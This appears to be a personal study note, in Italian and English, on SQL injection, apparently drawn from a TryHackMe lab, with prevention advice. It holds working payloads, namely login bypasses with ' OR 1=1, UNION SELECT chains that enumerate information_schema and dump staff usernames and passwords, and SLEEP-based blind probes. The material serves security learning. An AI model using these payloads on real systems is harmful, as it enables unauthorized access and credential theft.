# Sql Injection


L'SQL injection è una tecnica di attacco informatico che sfrutta le vulnerabilità nelle applicazioni web che interagiscono con un database. Questo tipo di attacco consente a un malintenzionato di inserire o "iniettare" codice SQL malevolo in una query SQL, con l'obiettivo di manipolare il database in modi non autorizzati.

Vulnerabilità: L'SQL injection si verifica quando un'applicazione web non valida correttamente i dati forniti dall'utente. Ad esempio, se un'applicazione accetta input da un modulo di login senza filtrare o sanificare i dati, un attaccante può inserire codice SQL.



Esempio di attacco: Supponiamo che un'applicazione utilizzi una query SQL simile a questa per autenticare un utente:


```
SELECT * FROM utenti WHERE username = 'input_utente' AND password = 'input_password';
```

Se un attaccante inserisce come nome utente admin' --, la query diventa:

```
SELECT * FROM utenti WHERE username = 'admin' --' AND password = 'input_password';
```
In questo caso, il -- commenta il resto della query, quindi l'attaccante riesce ad accedere come utente "admin" senza conoscere la password.

Conseguenze: Gli attacchi di SQL injection possono portare a vari problemi, tra cui:<br>
Accesso non autorizzato ai dati sensibili.<br>
Modifica o cancellazione di dati nel database.<br>
Esecuzione di comandi di sistema sul server.<br>
Esfiltrazione di dati riservati.<br>

Prevenzione: Per proteggere le applicazioni da attacchi di SQL injection, è importante:
Utilizzare query parametrizzate o prepared statements, che separano i dati dal codice SQL.
Validare e sanificare sempre l'input dell'utente.
Implementare controlli di accesso adeguati e monitorare le attività sospette.


________________________________


## In band Sql Injection


L'In-Band SQL Injection è una delle forme più comuni di attacco SQL injection, in cui l'attaccante riesce a ottenere informazioni dal database attraverso il canale di comunicazione già utilizzato per inviare le richieste. In altre parole, l'attaccante sfrutta la stessa connessione per inviare comandi SQL malevoli e ricevere i risultati.


Ci sono due sottotipi principali di In-Band SQL Injection:

1. **Error-Based SQL Injection**: In questo caso, l'attaccante provoca un errore nel database che rivela informazioni utili. Ad esempio, se l'attaccante inserisce un input progettato per generare un errore, il messaggio di errore restituito dal database può contenere dettagli sulla struttura del database, come nomi di tabelle o colonne. Questo tipo di attacco è utile per raccogliere informazioni sul database.

   **Esempio**: Se l'attaccante inserisce un input come `1' AND 1=CONVERT(int, (SELECT @@version)) --`, il database potrebbe restituire un errore che rivela la versione del database in uso.

2. **Union-Based SQL Injection**: Questo tipo di attacco sfrutta l'operatore `UNION` per combinare i risultati di più query. L'attaccante può utilizzare questa tecnica per estrarre dati da altre tabelle nel database. Per farlo, l'attaccante deve conoscere il numero di colonne nella query originale e il tipo di dati che ciascuna colonna restituisce.

   **Esempio**: Se l'applicazione originale esegue una query come `SELECT nome, email FROM utenti WHERE id = 1`, l'attaccante potrebbe iniettare un input come `1 UNION SELECT username, password FROM admin --`. Questo restituirebbe i nomi utente e le password dalla tabella "admin".

### Prevenzione dell'In-Band SQL Injection

Per proteggere le applicazioni da attacchi di In-Band SQL Injection, è fondamentale adottare le seguenti misure:

- **Utilizzare Prepared Statements**: Le query parametrizzate separano i dati dal codice SQL, riducendo il rischio di iniezione.
- **Sanificare l'Input**: Validare e filtrare sempre i dati forniti dagli utenti per rimuovere caratteri pericolosi.
- **Limitare i Messaggi di Errore**: Non rivelare informazioni dettagliate sugli errori del database agli utenti finali, poiché possono fornire indizi utili agli attaccanti.
- **Implementare Controlli di Accesso**: Assicurarsi che solo gli utenti autorizzati possano accedere a determinate informazioni o funzionalità.


## Pratical 


The key to discovering error-based SQL Injection is to break the code's SQL query by trying certain characters until an error message is produced; these are most commonly single apostrophes ( ' ) or a quotation mark ( " ).


Try typing an apostrophe ( ' ) after the id=1 and press enter. And you'll see this returns an SQL error informing you of an error in your syntax. The fact that you've received this error message confirms the existence of an SQL Injection vulnerability. We can now exploit this vulnerability and use the error messages to learn more about the database structure.


```
https://website-example.com/article?id=1 UNION SELECT 1
```
La parte UNION SELECT 1 è ciò che rende questa query un tentativo di SQL injection.<br><br>

UNION: L'operatore UNION combina i risultati di due o più query SELECT. Per funzionare correttamente, le query devono avere lo stesso numero di colonne e tipi di dati compatibili.<br>
SELECT 1: Questa parte della query seleziona semplicemente il valore 1. Non specifica alcuna tabella, quindi non sta cercando di estrarre dati da una tabella esistente.<br><br>


we'll get the database name that we have access to:
```
https://website-example.com/article?id=0 UNION SELECT 1,2,database()
```

Our next query will gather a list of tables that are in this database.
```
https://website.thm/article?id=0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'sqli_one'
```


We can utilise the information_schema database again to find the structure of this table using the below query.
```
https://website.thm/article?id=0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'staff_users'
```

The query results provide three columns for the staff_users table: id, password, and username. We can use the username and password columns for our following query to retrieve the user's information.

```
https://website.thm/article?id=0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>') FROM staff_users
```

____________________________________






Il **Blind SQL Injection** (Blind SQLi) è una forma di attacco SQL injection in cui l'attaccante non può vedere direttamente i risultati delle query SQL iniettate, ma può comunque dedurre informazioni sul database attraverso il comportamento dell'applicazione. Questo tipo di attacco è spesso utilizzato per bypassare meccanismi di autenticazione e ottenere accesso non autorizzato.

### Come Funziona il Blind SQL Injection

In un attacco di Blind SQLi, l'attaccante invia input malevoli a un'applicazione web e osserva le risposte dell'applicazione per dedurre informazioni. Poiché non ci sono messaggi di errore o risultati visibili, l'attaccante deve basarsi su indizi indiretti.

#### Tipi di Blind SQL Injection

1. **Boolean-Based Blind SQL Injection**: In questo caso, l'attaccante modifica la query in modo che restituisca un risultato vero o falso. Ad esempio, se l'attaccante inserisce un input come `1' AND (SELECT SUBSTRING(username, 1, 1) FROM users WHERE id = 1) = 'a' --`, l'applicazione restituirà una risposta diversa a seconda che la condizione sia vera o falsa. L'attaccante può quindi utilizzare questa tecnica per indovinare i valori nel database, carattere per carattere.

2. **Time-Based Blind SQL Injection**: In questo caso, l'attaccante sfrutta il tempo di risposta dell'applicazione. Ad esempio, l'attaccante può iniettare una query che causa un ritardo nella risposta, come `1' OR IF((SELECT SUBSTRING(username, 1, 1) FROM users WHERE id = 1) = 'a', SLEEP(5), 0) --`. Se l'applicazione impiega più tempo a rispondere, l'attaccante sa che la condizione è vera.

### Esempio di Bypass dell'Autenticazione

Supponiamo che un'applicazione web utilizzi una query SQL per autenticare un utente:

```sql
SELECT * FROM users WHERE username = 'input_username' AND password = 'input_password';
```

Un attaccante potrebbe tentare di bypassare l'autenticazione utilizzando una tecnica di Blind SQLi. Ecco un esempio di come potrebbe procedere:

1. **Input Malevolo**: L'attaccante inserisce un nome utente come `admin' OR '1'='1` e una password qualsiasi. La query diventa:
   ```sql
   SELECT * FROM users WHERE username = 'admin' OR '1'='1' AND password = 'any_password';
   ```
   Poiché `1=1` è sempre vero, l'attaccante potrebbe ottenere accesso come utente "admin".

2. **Utilizzo di Blind SQLi**: Se l'applicazione non restituisce errori o messaggi chiari, l'attaccante potrebbe utilizzare tecniche di Blind SQLi per verificare se l'utente "admin" esiste nel database. Potrebbe inviare richieste come:
   ```sql
   ' OR (SELECT COUNT(*) FROM users WHERE username = 'admin') > 0 --
   ```
   Se l'applicazione restituisce una risposta positiva, l'attaccante sa che l'utente "admin" esiste.

### Prevenzione del Blind SQL Injection

Per proteggere le applicazioni da attacchi di Blind SQL Injection e bypass dell'autenticazione, è fondamentale:

- **Utilizzare Prepared Statements**: Le query parametrizzate impediscono l'iniezione di codice SQL.
- **Sanificare l'Input**: Validare e filtrare sempre i dati forniti dagli utenti.
- **Limitare i Messaggi di Errore**: Non rivelare informazioni dettagliate sugli errori del database.
- **Implementare Controlli di Accesso**: Assicurarsi che solo gli utenti autorizzati possano accedere a determinate informazioni o funzionalità.



Nota :
Suppongo di avere questa query di partenza :
select * from users where username='%username%' and password='%password%' LIMIT 1;

Se ho una form da completare User name e password  , nella password posso fare inject di ' OR 1=1;--

la query sarà quindi :
select * from users where username='' and password='' OR 1=1;

la parte ;-- mi commenta LIMIT 1 ;

Because 1=1 is a true statement and we've used an OR operator, this will always cause the query to return as true, which satisfies the web applications logic that the database found a valid username/password combination and that access should be allowed.












